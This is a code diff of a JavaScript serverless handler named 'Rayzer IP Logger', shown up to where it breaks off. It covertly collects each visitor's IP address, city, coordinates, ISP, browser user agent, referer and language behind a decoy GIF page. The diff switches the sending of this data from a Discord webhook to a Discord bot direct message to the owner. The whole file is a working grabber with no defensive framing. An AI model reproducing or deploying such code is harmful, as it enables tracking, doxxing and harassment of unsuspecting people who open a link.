@@ -1,14 +1,14 @@
-// /api/rayzer.js
+// /web/DISCORD_BOT/rayzer.js
 
-// CONFIGURATION
-const WEBHOOK_URL = "PUT YOUR WEBHOOK HERE"; // webhook url
-const GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif"; // gif url
+const BOT_TOKEN = "PUT_BOT_TOKEN_HERE";
+const OWNER_ID = "PUT_OWNER_ID_HERE";
+const GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";
 
 export default async function handler(req, res) {
   const ip = (req.headers["x-forwarded-for"] || req.connection.remoteAddress || "").split(",")[0].trim();
-  const userAgent = req.headers["user-agent"] || "Yok";
-  const referer = req.headers["referer"] || "Yok";
-  const lang = req.headers["accept-language"] || "Yok";
+  const userAgent = req.headers["user-agent"] || "None";
+  const referer = req.headers["referer"] || "None";
+  const lang = req.headers["accept-language"] || "None";
 
   let geo = {};
   try {
@@ -19,16 +19,15 @@ export default async function handler(req, res) {
   }
 
   const embed = {
-    username: "Rayzer IP Logger",
     embeds: [
       {
-        title: "New Log 🔍",
-        color: 0x2f3136,
+        title: "New Log (Discord Bot DM) 🔍",
+        color: 0x5865f2,
         fields: [
           { name: "IP", value: `\`${ip}\``, inline: true },
           { name: "Location", value: `${geo.city}, ${geo.regionName}, ${geo.country}`, inline: true },
           { name: "Cords", value: `${geo.lat}, ${geo.lon}`, inline: true },
-          { name: "ISP", value: geo.isp || "Bilinmiyor", inline: false },
+          { name: "ISP", value: geo.isp || "Unknown", inline: false },
           { name: "User-Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
           { name: "Referer", value: referer, inline: false },
           { name: "Language", value: lang, inline: true }
@@ -39,12 +38,30 @@ export default async function handler(req, res) {
     ]
   };
 
+  try {
+    const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
+      method: "POST",
+      headers: {
+        "Authorization": `Bot ${BOT_TOKEN}`,
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ recipient_id: OWNER_ID })
+    });
+    const dmChannel = await dmRes.json();
 
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(embed)
-  }).catch(() => { });
+    if (dmChannel.id) {
+      await fetch(`https://discord.com/api/v10/channels/${dmChannel.id}/messages`, {
+        method: "POST",
+        headers: {
+          "Authorization": `Bot ${BOT_TOKEN}`,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(embed)
+      });
+    }
+  } catch (e) {
+    console.error("Discord API Error:", e);
+  }
 
   res.setHeader("Content-Type", "text/html");
   res.status(200).send(`
